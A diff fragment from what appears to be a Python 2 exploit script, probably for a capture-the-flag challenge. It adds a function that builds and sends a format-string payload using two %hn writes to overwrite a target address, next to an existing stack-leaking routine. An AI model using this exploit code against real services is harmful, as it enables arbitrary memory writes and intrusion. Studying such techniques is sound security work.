@@ -124,7 +124,16 @@ def leakstack(r,start,end,writes):
      except EOFError :
        print "[+] no luck here !!"
        i=i+1
-
+def send_rev_payload(r,dest,data,offset):
+   data_off_l = data & 0xFFFF
+   data_off_u = (data >> 16) & 0xFFFF
+   num1 = data_off_u - 8
+   num2 =  data_off_l - data_off_u
+   print "[+] Data_high = %x , Data_low = %x " %(data_off_u, data_off_l)
+   payload = pack(dest)+pack(dest+2)+"%"+str(num1)+"u"+"%"+str(offset+1)+"$hn"+"%"+str(num2)+"u"+"%"+str(offset)+"$hn"
+   print "[+] payload = "+repr(payload)
+   r.sendline(payload)
+  
 
 
 
